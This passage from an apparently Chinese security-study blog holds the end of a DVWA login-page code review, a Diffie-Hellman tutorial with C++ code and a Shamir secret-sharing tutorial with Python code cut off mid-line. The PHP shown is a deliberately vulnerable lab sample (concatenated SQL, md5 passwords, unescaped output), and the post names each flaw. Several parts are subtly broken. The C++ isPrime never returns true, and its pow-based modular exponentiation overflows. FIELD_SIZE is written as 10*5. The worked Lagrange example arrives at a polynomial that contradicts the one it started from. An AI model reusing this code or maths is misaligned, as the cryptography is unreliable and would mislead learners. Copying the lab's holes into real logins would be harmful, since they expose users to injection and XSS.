<code>md5($pass)</code>：<strong>非常不安全</strong>，见下文</p></li></ul><hr><h3 id="✅-4-构造并执行-SQL-查询"><a href="#✅-4-构造并执行-SQL-查询" class="headerlink" title="✅ 4. 构造并执行 SQL 查询"></a>✅ 4. 构造并执行 SQL 查询</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(...);</span><br></pre></td></tr></table></figure><ul><li><p>这是典型的用户名 + 密码校验语句</p></li><li><p>❌ 使用了<strong>拼接 SQL 语句</strong>而不是参数化查询（<strong>仍有注入风险</strong>）</p></li></ul><hr><h3 id="✅-5-判断登录是否成功"><a href="#✅-5-判断登录是否成功" class="headerlink" title="✅ 5. 判断登录是否成功"></a>✅ 5. 判断登录是否成功</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br></pre></td></tr></table></figure><ul><li><p>如果只有一条记录，表示用户名和密码匹配</p></li><li><p>成功时显示头像并欢迎用户</p></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>❗ <strong>未经过 <code>htmlspecialchars()</code> 转义</strong>，仍有 <strong>XSS 风险</strong></p><hr><h3 id="✅-6-登录失败处理"><a href="#✅-6-登录失败处理" class="headerlink" title="✅ 6. 登录失败处理"></a>✅ 6. 登录失败处理</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">sleep</span>( <span class="title function_ invoke__">rand</span>( <span class="number">0</span>, <span class="number">3</span> ) );</span><br></pre></td></tr></table></figure><ul><li>✅ 添加了<strong>随机延迟</strong>，降低爆破攻击效率</li></ul><hr><h3 id="✅-7-生成-CSRF-Token"><a href="#✅-7-生成-CSRF-Token" class="headerlink" title="✅ 7. 生成 CSRF Token"></a>✅ 7. 生成 CSRF Token</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br></pre></td></tr></table></figure><ul><li><p>表示页面加载时会为用户创建一个随机的 session token</p></li><li><p>页面上应该会包含 <code>&lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;...&quot;&gt;</code></p></li></ul><hr><h2 id="❗-安全问题总结与建议"><a href="#❗-安全问题总结与建议" class="headerlink" title="❗ 安全问题总结与建议"></a>❗ 安全问题总结与建议</h2><div class="table-container"><table><thead><tr><th>问题</th><th>解释</th><th>建议</th></tr></thead><tbody><tr><td>❌ 使用 GET 提交表单</td><td>用户名、密码会暴露在 URL</td><td>✅ 改用 POST</td></tr><tr><td>❌ 使用 md5 存储密码</td><td>不安全，易被破解</td><td>✅ 使用 <code>password_hash</code> 和 <code>password_verify</code></td></tr><tr><td>❌ SQL 拼接</td><td>即使转义了，仍可能有注入风险</td><td>✅ 使用 prepared statements</td></tr><tr><td>❌ 输出未转义</td><td>用户名或头像路径可被注入 JS 脚本</td><td>✅ 使用 <code>htmlspecialchars()</code></td></tr><tr><td>⚠ 依赖老函数（如 stripslashes）</td><td>可能说明 PHP 配置问题</td><td>✅ 建议检查 <code>magic_quotes_gpc</code> 是否关闭</td></tr></tbody></table></div><hr>]]></content>
      
      
      <categories>
          
          <category> DVWA靶场之旅 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Diffie-Hellman密钥交换协议</title>
      <link href="/2025/04/05/Diffie-Hellman%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2%E5%8D%8F%E8%AE%AE/"/>
      <url>/2025/04/05/Diffie-Hellman%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="Diffile-Hellman密钥交换协议"><a href="#Diffile-Hellman密钥交换协议" class="headerlink" title="Diffile-Hellman密钥交换协议"></a>Diffile-Hellman密钥交换协议</h1><p>作者: hxd</p><p></p><p>日期: 2025年3月28日</p><br><strong>Diffie-Hellman（迪菲-赫尔曼）</strong>是一种密钥交换协议，由 Whitfield Diffie 和 Martin Hellman 在 1976 年提出。它是现代密码学中最重要的协议之一，用于在不安全的通信渠道上安全地交换密钥。Diffie-Hellman 协议的核心思想是允许双方通过公开的通信渠道生成一个共享的密钥，而无需事先共享任何秘密信息。<p></p><h3 id="Diffie-Hellman-的核心概念"><a href="#Diffie-Hellman-的核心概念" class="headerlink" title="Diffie-Hellman 的核心概念"></a><strong>Diffie-Hellman 的核心概念</strong></h3><ol><li><strong>密钥交换的目标</strong>：<ul><li>通信双方（例如 Alice 和 Bob）希望生成一个共享的密钥，用于后续的加密通信（如对称加密）。</li><li>这个密钥需要在公开的通信渠道上生成，即使攻击者监听了通信内容，也无法推导出共享密钥。</li></ul></li><li><strong>数学基础</strong>：<ul><li>Diffie-Hellman 基于<strong>离散对数问题</strong>的数学难题。</li><li>它使用<strong>模幂运算</strong>和<strong>大素数的性质</strong>来确保安全性。</li></ul></li><li><strong>协议流程</strong>：<ul><li>双方协商两个公开的参数：一个大素数$p$和一个生成元$g$（$g$是模$p$的一个原根）。</li><li>双方各自选择一个私密的随机数（$a$和$b$），并计算自己的公钥：<ul><li>Alice 的公钥：$A = g^a \mod p$</li><li>Bob 的公钥：$B = g^b \mod p$</li></ul></li><li>双方交换公钥。</li><li>双方使用对方的公钥和自己的私钥计算共享密钥：<ul><li>Alice 计算：$S = B^a \mod p$</li><li>Bob 计算：$S = A^b \mod p$</li></ul></li><li>由于$S = g^{ab} \mod p$，双方最终得到相同的共享密钥。</li></ul></li></ol><hr><h3 id="Diffie-Hellman-的示例"><a href="#Diffie-Hellman-的示例" class="headerlink" title="Diffie-Hellman 的示例"></a><strong>Diffie-Hellman 的示例</strong></h3><ol><li><strong>参数选择</strong>：<ul><li>选择一个大素数$p = 23$和一个生成元$g = 5$。</li></ul></li><li><strong>私钥选择</strong>：<ul><li>Alice 选择一个私钥$a = 6$，计算公钥$A = 5^6 \mod 23 = 8$。</li><li>Bob 选择一个私钥$b = 15$，计算公钥$B = 5^{15} \mod 23 = 19$。</li></ul></li><li><strong>交换公钥</strong>：<ul><li>Alice 发送$A = 8$给 Bob。</li><li>Bob 发送$B = 19$给 Alice。</li></ul></li><li><strong>计算共享密钥</strong>：<ul><li>Alice 计算$S = B^a \mod p = 19^6 \mod 23 = 2$。</li><li>Bob 计算$S = A^b \mod p = 8^{15} \mod 23 = 2$。</li><li>双方得到相同的共享密钥$S = 2$。</li></ul></li></ol><hr><h3 id="Diffie-Hellman-的安全性"><a href="#Diffie-Hellman-的安全性" class="headerlink" title="Diffie-Hellman 的安全性"></a><strong>Diffie-Hellman 的安全性</strong></h3><ol><li><strong>离散对数问题</strong>：<ul><li>攻击者即使知道$p, g, A, B$，也无法轻易计算出$a$或$b$，因为计算离散对数（即从$A = g^a \mod p$中求出$a$）在计算上是不可行的。</li></ul></li><li><strong>中间人攻击</strong>：<ul><li>Diffie-Hellman 本身不提供身份验证，因此容易受到中间人攻击（Man-in-the-Middle Attack）。</li><li>为了解决这个问题，通常需要结合数字签名或其他身份验证机制。</li></ul></li></ol><hr><h3 id="Diffie-Hellman-的应用"><a href="#Diffie-Hellman-的应用" class="headerlink" title="Diffie-Hellman 的应用"></a><strong>Diffie-Hellman 的应用</strong></h3><ol><li><strong>TLS/SSL</strong>：<ul><li>Diffie-Hellman 是 TLS/SSL 协议中密钥交换的一种常用方法（如 DHE 和 ECDHE）。</li></ul></li><li><strong>VPN</strong>：<ul><li>许多 VPN 协议（如 IPsec）使用 Diffie-Hellman 来建立安全的通信通道。</li></ul></li><li><strong>SSH</strong>：<ul><li>SSH 协议也使用 Diffie-Hellman 来协商会话密钥。</li></ul></li></ol><hr><h3 id="Diffie-Hellman-的变种"><a href="#Diffie-Hellman-的变种" class="headerlink" title="Diffie-Hellman 的变种"></a><strong>Diffie-Hellman 的变种</strong></h3><ol><li><strong>椭圆曲线 Diffie-Hellman（ECDH）</strong>：<ul><li>基于椭圆曲线密码学，提供更高的安全性和更小的密钥长度。</li></ul></li><li><strong>静态 Diffie-Hellman</strong>：<ul><li>使用固定的公钥和私钥，适用于长期通信。</li></ul></li></ol><hr><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="C-实现"><a href="#C-实现" class="headerlink" title="C++实现"></a>C++实现</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//计算a^b mod P</span></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">power</span><span class="params">(<span class="type">long</span> <span class="type">long</span> a, <span class="type">long</span> <span class="type">long</span> b, <span class="type">long</span> <span class="type">long</span> P)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (b == <span class="number">1</span>)<span class="keyword">return</span> a;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">return</span> (<span class="type">long</span> <span class="type">long</span>)<span class="built_in">pow</span>(a, b) % P;<span class="comment">//显式类型转化</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//试除法判断是不是素数</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isPrime</span><span class="params">(<span class="type">long</span> <span class="type">long</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">long</span> <span class="type">long</span> i = <span class="number">1</span>; i &lt;= <span class="built_in">sqrt</span>(n); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (n % i == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否是原根</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isOriginRoot</span><span class="params">(<span class="type">long</span> <span class="type">long</span> g,<span class="type">long</span> <span class="type">long</span> P)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (; g &lt;= P; g++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">int</span>)<span class="built_in">pow</span>(g, P - <span class="number">1</span>) % P == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; g &lt;&lt; <span class="string">&quot;is Origin Root&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> P, G=<span class="number">2</span>, x, a, y, b, ka, kb;</span><br><span class="line"><span class="type">int</span> seed;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Please enter a seed: &quot;</span>;</span><br><span class="line">cin &gt;&gt; seed;</span><br><span class="line"><span class="built_in">srand</span>(seed);</span><br><span class="line"><span class="comment">//P是一个大素数</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">P = <span class="built_in">rand</span>();</span><br><span class="line">cout &lt;&lt; P &lt;&lt; endl;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">isPrime</span>(P))</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; P &lt;&lt; <span class="string">&quot; is a prime .&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">isOriginRoot</span>(G, P))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;The value of P : &quot;</span> &lt;&lt; P &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;The value of G :&quot;</span> &lt;&lt; G &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Alice will choose the private key a</span></span><br><span class="line">a =<span class="built_in">rand</span>()%P;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;The private key a for Alice : &quot;</span>&lt;&lt;a&lt;&lt; endl;</span><br><span class="line">x = <span class="built_in">power</span>(G, a, P);<span class="comment">//get the Alice public key</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Bob will choose the private key b</span></span><br><span class="line">b = <span class="built_in">rand</span>() % P;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;The private key b for Bob : &quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line">y = <span class="built_in">power</span>(G, b, P);<span class="comment">//get the Bob public key</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Generating the secret key after exchange</span></span><br><span class="line">ka = <span class="built_in">power</span>(y, a, P);</span><br><span class="line">kb = <span class="built_in">power</span>(x, b, P);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Secret key for the Alice is ：&quot;</span> &lt;&lt; ka &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Secret key for the Bob is : &quot;</span> &lt;&lt; kb &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shamir秘密共享</title>
      <link href="/2025/04/05/Shamir%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB/"/>
      <url>/2025/04/05/Shamir%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="Shamir秘密共享"><a href="#Shamir秘密共享" class="headerlink" title="Shamir秘密共享"></a>Shamir秘密共享</h1><p>作者：hxd</p><p>日期：2025年3月28日</p><h2 id="1-秘密共享"><a href="#1-秘密共享" class="headerlink" title="1. 秘密共享"></a>1. 秘密共享</h2><p>秘密 $s$ （通过某种方案）被分为 $n$ 个部分,每个部分称为份额(share),由一个参与者持有，使得</p><ul><li>由 $k$ 个或多于 $k$ 个参与者所持有的部分信息可重构 $s$ </li><li>由少于 $k$ 个参与者所持有的部分信息则无法重构 $s$</li></ul><p>称该方案为 $(k,n)$ 门限秘密共享方案，$k$ 称为门限值。</p><h2 id="2-Shamir秘密共享（Shamir-Secret-Sharing-SSS）"><a href="#2-Shamir秘密共享（Shamir-Secret-Sharing-SSS）" class="headerlink" title="2. Shamir秘密共享（Shamir Secret Sharing SSS）"></a>2. Shamir秘密共享（Shamir Secret Sharing SSS）</h2><p><strong>Shamir秘密共享（Shamir’s Secret Sharing, SSS）</strong> 是一种密码学协议，由 Adi Shamir 在 1979 年提出。它的核心思想是将一个秘密（如密钥或敏感数据）分成多个部分（称为“份额”或“shares”），并将这些份额分发给多个参与者。只有达到一定数量的份额（称为“阈(yu)值”）才能恢复出原始秘密，而少于阈值的份额无法提供任何关于秘密的信息。</p><p>SSS 是一种<strong>门限秘密共享方案</strong>，广泛应用于分布式系统、密码学、数据备份和安全多方计算等领域。</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><img src="Shamir秘密共享/image-20250316201237978.png" alt=""></p><p>多项式上的 $k$ 个点能够唯一确定小于或等于 $k−1$ 次的多项式一般地，设${(x_1,y_1),…,(x_k,y_k)}$是平面上$k$个不同的点构成的点集，那么在平面上存在唯一的$k-1$次多项式$f(x)=a_0+a_1x+\cdots +a_{k-1}x^{k-1}$通过这$k$个点，其中$a_0,a_1,…a_k-1$是随机数。</p><p>确定好门限值$k$和总值$n$，若把秘密 <strong>$s$取做$f(0)$</strong> ，为每个参与者生成一个份额$(x_i, y_i)$，其中$y_i = f(x_i)$。$x_i(i=1\cdots n)$作为参与方id，$n$个份额取做$(x_i,f(x_i))(i=1,…n)$，那么利用其中任意$k$个份额可以重构$f(x)$，从而可以得到秘密$s$。</p><h3 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h3><ul><li><p>设$GF(q)$为大素数$q$生成的有限域，其中$q\ge n+1$.</p></li><li><p>秘密$s$是$GF(q)/{0}$上均匀选区的随机数，即$s\in GF(q)/{0}$.</p></li><li><p>在$GF(q)$上构造一个$k-1$次多项式$f(x)=a_0+a_1x+\cdots +a_{k-1}x^{k-1}$，其中：$a_0=s，a_i\in GF(q)/{0}(i\ne 0)$</p></li><li><p>$n$个参与者$P_1,P_2…,P_n$，其中$P_i$的份额为$f(i)$。任意$k$个参与者想要得到秘密$s$，可使用</p></li><li><script type="math/tex; mode=display">\left\{\begin{array}{c}a_0+a_1\left(x_{1}\right)+\cdots+a_{k-1}\left(x_1\right)^{k-1}=f\left(x_1\right) \\ \vdots \\ a_0+a_1\left(x_k\right)+\cdots+a_{k-1}\left(x_k\right)^{k-1}=f\left(x_k\right)\end{array}\right.</script></li><li></li></ul><p>例如：假定一个秘密值$s=45$，要求将其分给10个参与方，至少 3 方参与计算才能够恢复出原始秘密，即 $n=10,k=3$。构造对应的多项式 $f(x)=45+19x+13x^2$。在此多项式上选取连续的整数点作为各个子秘密：</p><script type="math/tex; mode=display">D_0=(1,77);D_1=(2,135);D_2=(3,219);D_3=(4,329);D_4=(5,465);\\D_5=(6,627);D_6=(7,815);D_7=(8,1029);D_8=(9,1269);D_9=(10,1535)</script><h3 id="秘密重建"><a href="#秘密重建" class="headerlink" title="秘密重建"></a>秘密重建</h3><p>对于 $y_i$ 值的任意 $k$ 个子集，我们可以通过插值找到 $f(x)$ 的多项式系数，然后计算 $s=f(0)$。另一方面，仅知道子集中的 $k−1$ 个并不足以计算出 $s$。</p><p><strong>在生成秘密份额的时候，已经确定需要$k$ 个秘密份额来恢复原始秘密。即根据$(x_1,y_1),(x_2,y_2),…,(x_k,y_k)$ 等一系列点构造出原始的多项式 $f(x)$，进而求解得到秘密值 $s=f(0)=a_0$。</strong></p><p>由Lagrange插值公式得：给定$n+1$个数据点$(x_0, y_0), (x_1, y_1), \ldots, (x_n, y_n)$，其中所有的$x_i$互不相同，拉格朗日插值多项式$f(x)$可以表示为：</p><script type="math/tex; mode=display">f(x) = \sum_{i=0}^{n} y_i \cdot \ell_i(x)</script><p>其中，$\ell_i(x)$是拉格朗日基多项式（也称为插值基函数），定义为：</p><script type="math/tex; mode=display">\ell_i(x) = \prod_{\substack{0 \leq j \leq n \\ j \neq i}} \frac{x - x_j}{x_i - x_j}</script><h4 id="基多项式的性质"><a href="#基多项式的性质" class="headerlink" title="基多项式的性质"></a>基多项式的性质</h4><ul><li><p>每个基多项式$\ell_i(x)$满足：</p><script type="math/tex; mode=display">\ell_i(x_j) = \begin{cases}1 & \text{如果 } j = i, \\0 & \text{如果 } j \neq i.\end{cases}</script></li><li><p>因此，$P(x_i) = y_i$对所有$i$成立，确保多项式通过所有给定点。</p></li></ul><ol><li><p>当$j = i$时（即$x=x_{i}$） 基多项式$\ell_i(x)$的定义为：$\ell_i(x) = \prod_{\substack{0 \leq j \leq n \ j \neq i}} \frac{x-x_{j}}{x_{i}-x_{j}}$。将$x=x_{i}$代入：</p><ul><li>分子部分：$x_i - x_j$（与分母相同）。</li><li>分母部分：$x_i - x_j$（与分子相同）。</li></ul><p>因此，每一项的值为$\frac{x_i - x_j}{x_i - x_j} = 1$，连乘后得到：</p><p>$\ell_i(x_i)=\prod_{j\neq i}1=1.$</p></li></ol><hr><p> 2.当$j \neq i$时（即$x = x_k$且$k \neq i$）</p><p>  观察$\ell_i(x)$的连乘积形式：</p><p>  $\ell_i(x)=\frac{(x-x_0)}{(x_i-x_0)}\cdot\frac{(x-x_1)}{(x_i-x_1)}\cdots\frac{(x-x_{i-1})}{(x_i-x_{i-1})}\cdot\frac{(x-x_{i+1})}{(x_i-x_{i+1})}\cdots\frac{(x-x_n)}{(x_i-x_n)}$ </p><p>  当$x = x_k$（$k \neq i$）时，连乘积中必定存在一项分子为$x_k - x_k = 0$（即第$k$项）。因此：</p><p>  $\ell_i(x_k) = \text{（其他项）} \cdot \frac{x_k - x_k}{x_i - x_k} \cdot \text{（其他项）} = 0.$</p><hr><h4 id="直观理解"><a href="#直观理解" class="headerlink" title="直观理解"></a>直观理解</h4><ul><li>$\ell_i(x)$是一个“开关函数”：它在$x_i$处取值为 1，在其他数据点$x_j$（$j \neq i$）处强制为 0。</li><li><strong>插值多项式的构造</strong>：通过将每个$y_i$与对应的$\ell_i(x)$相乘后相加（$P(x) = \sum y_i \ell_i(x)$），可以确保：<ul><li>在$x = x_i$时，只有$\ell_i(x_i) = 1$，其他基函数均为 0，因此$P(x_i) = y_i$。</li><li>在其他点$x_j$（$j \neq i$），$\ell_i(x_j) = 0$的机制避免了不同$y_j$之间的干扰。</li></ul></li></ul><hr><h4 id="例子验证"><a href="#例子验证" class="headerlink" title="例子验证"></a>例子验证</h4><p>  假设有 3 个点$(x_0, x_1, x_2)$，基函数$\ell_1(x)$为：</p><script type="math/tex; mode=display">\ell_1(x) = \frac{(x - x_0)(x - x_2)}{(x_1 - x_0)(x_1 - x_2)}</script><ul><li>在$x = x_1$时：</li></ul><script type="math/tex; mode=display">\ell_1(x_1) = \frac{(x_1 - x_0)(x_1 - x_2)}{(x_1 - x_0)(x_1 - x_2)} = 1</script><ul><li>在$x = x_0$或$x = x_2$时：<script type="math/tex; mode=display">\ell_1(x_0) = \frac{(x_0 - x_0)(x_0 - x_2)}{(x_1-x_0)} = 0, \quad \ell_1(x_2) = \frac{(x_2 - x_0)(x_2 - x_2)}{(x_1-x_0)} = 0.</script></li></ul><p>为了重建秘密，任意选取3个参与方的秘密份额作为输入。这里选择 id 为 2，3，6的参与方进行秘密重建。 </p><p>$(x_0，y_0)=(2,135);（x_1，y_1)=(3,219);（x_2，y_2)=(6,627);$</p><script type="math/tex; mode=display">\begin{gathered}l_0(x)=\frac{x-x_1}{x_0-x_1} * \frac{x-x_2}{x_0-x_2}=\frac{x-3}{2-3} * \frac{x-6}{2-6}=\frac{1}{4} x^2-\frac{9}{4} x+\frac{9}{2} \\l_1(x)=\frac{x-x_0}{x_1-x_0} * \frac{x-x_2}{x_1-x_2}=\frac{x-2}{3-2} * \frac{x-6}{3-6}=-\frac{1}{3} x^2+\frac{8}{3} x-4 \\l_2(x)=\frac{x-x_0}{x_2-x_0} * \frac{x-x_1}{x_2-x_1}=\frac{x-2}{6-2} * \frac{x-3}{6-3}=\frac{1}{12} x^2-\frac{5}{12} x+\frac{1}{2} \\f(x)=\sum_{i=0}^2 y_i l_i(x)=y_0 l_0(x)+y_1 l_1(x)+y_2 l_2(x) \\=135\left(\frac{1}{4} x^2-\frac{9}{4} x+\frac{9}{2}\right)+ \\219\left(-\frac{1}{3} x^2+\frac{8}{3} x-4\right)+ \\627\left(\frac{1}{12} x^2-\frac{5}{12} x+\frac{1}{2}\right) \\=-13 x^2+10 x+45\end{gathered}</script><p>或者可以看出其实秘密</p><script type="math/tex; mode=display">\begin{array}{c}&s=y_0(\frac{x_1}{x_0-x_1}*\frac{x_2}{x_0-x_2})+y_1(\frac{x_0}{x_1-x_0}*\frac{x_2}{x_1-x_2})+y_2(\frac{x_0}{x_2-x_0}*\frac{x_1}{x_2-x_1})\\&=135*\frac{9}{2}+219*(-4)+627*\frac{1}{2}\\&=45\end{array}</script><p>所以秘密就是$s=a_0=45$。</p><h3 id="代码实现："><a href="#代码实现：" class="headerlink" title="代码实现："></a>代码实现：</h3><p>Python代码实现如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil <span class="comment">#ceil 是 math 模块中的一个函数，用于返回大于或等于给定数字的最小整数。例如，ceil(4.2)返回5</span></span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal<span class="comment">#Decimal 是 decimal 模块中的一个类，用于进行精确的十进制浮点运算，适用于需要高精度的金融计算等场景</span></span><br><span class="line">FIELD_SIZE=<span class="number">10</span>*<span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reconstruct_secret</span>(<span class="params">shares</span>):<span class="comment">#shares代表份额</span></span><br><span class="line">    <span class="comment">#使用拉格朗日插值法重构秘密</span></span><br><span class="line">    sums=<span class="number">0</span></span><br><span class="line">    prod_arr=[]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j,share_j <span class="keyword">in</span> <span class="built_in">enumerate</span>(shares):<span class="comment">#enumerate表示同时获取索引值和元素值</span></span><br><span class="line">        xj,yj=share_j;</span><br><span class="line">        prod=Decimal(<span class="number">1</span>)<span class="comment">#prod等于高精度的1</span></span><br><span class="line">        <span class="keyword">for</span> i,share_i <span class="keyword">in</span> <span class="built_in">enumerate</span>(shares):</span><br><span class="line">            xi,_=share_i</span><br><span class="line">            <span class="keyword">if</span> i!=j:<span class="comment">#当i不等于j时</span></span><br><span class="line">                prod*=Decimal(Decimal(xi)/(xj-xi))</span><br><span class="line">        prod*=yj</span><br><span class="line">        sums+=Decimal(prod)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">round</span>(Decimal(sums), <span class="number">0</span>))</span><br><span class="line">        <span class="comment">#sums 转换为 Decimal 类型，并四舍五入到最接近的整数(0表示四舍五入到小数点后0位)，然后将结果转换为 int 类型并返回</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">polynom</span>(<span class="params">x,coefficients</span>):    <span class="comment">#coefficients是多项式列表</span></span><br><span class="line">    <span class="comment">#多项式计算的值</span></span><br><span class="line">    point=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> coefficient_index,coefficients_value <span class="keyword">in</span> <span class="built_in">enumerate</span>(coefficients[::-<span class="number">1</span>]):</span><br><span class="line">        <span class="comment">#反向遍历coefficients列表，从列表最后一个元素开始，依次向前遍历每个元素</span></span><br><span class="line">        point+=x**coefficient_index*coefficients_value</span><br><span class="line">    <span class="comment">#print(point)</span></span><br><span class="line">    <span class="keyword">return</span> point    <span class="comment">#返回计算的值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">coeff</span>(<span class="params">k,secret</span>):</span><br><span class="line">    <span class="comment">#随机构造多项式，k-1次的，常数是秘密</span></span><br><span class="line">    coeff=[random.randrange(<span class="number">0</span>,FIELD_SIZE) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k-<span class="number">1</span>)]</span><br><span class="line">    <span class="comment">#生成包含k-1个随机值a_i的列表</span></span><br><span class="line">    coeff.append(secret) <span class="comment">#append()秘密到列表后面了</span></span><br><span class="line">    <span class="keyword">return</span> coeff<span class="comment">#返回多项式列表</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_shares</span>(<span class="params">n,k,secret</span>):</span><br><span class="line">    <span class="comment">#n代表秘密总数，k代表阀值</span></span><br><span class="line">    <span class="comment">#secret代表秘密</span></span><br><span class="line">    coefficients=coeff(k,secret)<span class="comment">#构造多项式，coefficients是多项式列表</span></span><br><span class="line">    shares=[];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n+<span class="number">1</span>):</span><br><span class="line">        x=random.randrange(<span class="number">1</span>,FIELD_SIZE)</span><br><span class="line">        shares.append((x,polynom(x,coefficients)))<span class="comment">#返回的是份额(x_i,y_i)的列表</span></span><br><span class="line">    <span class="comment">#print(shares)</span></span><br><span class="line">    <span class="keyword">return</span> shares</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入秘密s被分为几个部分n:&quot;</span>))</span><br><span class="line">    k=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入阀值k:&quot;</span>))</span><br><span class="line">    secret=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入秘密s:&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span 